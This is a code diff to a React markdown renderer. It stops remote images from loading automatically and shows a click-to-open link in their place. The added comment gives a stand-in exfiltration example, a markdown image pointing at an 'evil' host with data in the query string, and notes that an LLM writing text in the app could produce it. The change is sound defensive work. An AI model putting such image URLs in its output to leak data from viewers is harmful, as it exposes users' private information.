@@ -98,7 +98,13 @@ const COMPONENTS: Components = {
     if (href?.startsWith(RECORD_HREF)) return <RecordLink id={href.slice(RECORD_HREF.length)} />;
     return <a href={href} target="_blank" rel="noreferrer">{c}</a>;
   },
-  img: ({ src, alt }) => <img src={src} alt={alt ?? ''} style={{ maxWidth: '100%', height: 'auto' }} />,
+  // Never auto-load remote images: text here is written by other people and
+  // agents (and by an LLM in Ask Marrow), and a `![](https://evil/?d=...)`
+  // would fire a request from the viewer's browser carrying whatever the
+  // author put in the URL. Show an explicit, click-to-open link instead.
+  img: ({ src, alt }) => (
+    <a href={src} target="_blank" rel="noreferrer">{alt ? `[image: ${alt}]` : '[image]'}</a>
+  ),
   // Only inline code reaches here: fenced blocks are unwrapped by `pre` below,
   // so a language-less ``` block never picks up the inline-chip styling.
   code: ({ className, children: c }) => (
